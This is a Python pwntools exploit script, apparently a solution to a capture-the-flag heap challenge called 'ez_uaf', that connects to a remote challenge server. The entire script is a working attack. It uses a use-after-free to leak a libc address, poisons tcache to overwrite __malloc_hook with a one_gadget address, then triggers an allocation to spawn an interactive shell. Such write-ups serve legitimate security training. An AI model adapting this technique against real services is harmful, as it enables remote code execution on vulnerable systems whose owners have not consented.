from pwn import *

#io = process("./ez_uaf")

io = remote("node5.anna.nssctf.cn", 27477)
libc = ELF(
    "./libc6-dbg_2.27-3ubuntu1.6_amd64/data/usr/lib/debug/lib/x86_64-linux-gnu/libc-2.27.so"
)
context(os="linux", arch="amd64", log_level="info")


def add(size: int, name: bytes, content: bytes):
    io.recvuntil(b"Choice:")
    io.sendline(b"1")
    io.recvuntil(b"Size:")
    io.sendline(str(size).encode())
    io.recvuntil(b"Name:")
    io.sendline(name)
    io.recvuntil(b"Content:")
    io.sendline(content)


def delete(idx: int):
    io.recvuntil(b"Choice:")
    io.sendline(b"2")
    io.recvuntil(b"idx:")
    io.sendline(str(idx).encode())


def show(idx: int):
    io.recvuntil(b"Choice:")
    io.sendline(b"3")
    io.recvuntil(b"idx:")
    io.sendline(str(idx).encode())


def edit(idx: int, content: bytes):
    io.recvuntil(b"Choice:")
    io.sendline(b"4")
    io.recvuntil(b"idx:")
    io.sendline(str(idx).encode())
    sleep(0.1)
    io.sendline(content)


def gdb_debug():
    gdb.attach(
        io,
        gdbscript="""
    set debug-file-directory /data/project/ctf-repo/pwn/nssctf/HNCTF_2022_WEEK4-ez_uaf/libc_dbg/debug
    nosharedlibrary
    sharedlibrary
    """,
    )


add(0x410, b"a", b"a")
print("add(0)")
add(0x20, b"b", b"1111")
print("add(1)")
delete(0)
print("delete(0)")
show(0)
print("show(0)")

address = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
malloc_hook = address - 96 - 16
print("malloc hook address =", hex(malloc_hook))
libc_base = malloc_hook - libc.sym["__malloc_hook"]
print("libc base address =", hex(libc_base))
one_gadgets_addr = 0x10A2FC + libc_base
print("gadgets =", hex(one_gadgets_addr))


delete(1)
print("delete(1)")
edit(1, p64(malloc_hook))
print("edit(1)")


add(0x10, b"2222", b"2222")
print("add(2)")
add(0x20, b"3333", b"3333")
print("add(3)")

edit(3, p64(one_gadgets_addr))
print("edit(3)")


io.sendlineafter(b"Choice: \n", b"1")
io.sendlineafter(b"Size:\n", b"0x20")

io.interactive()
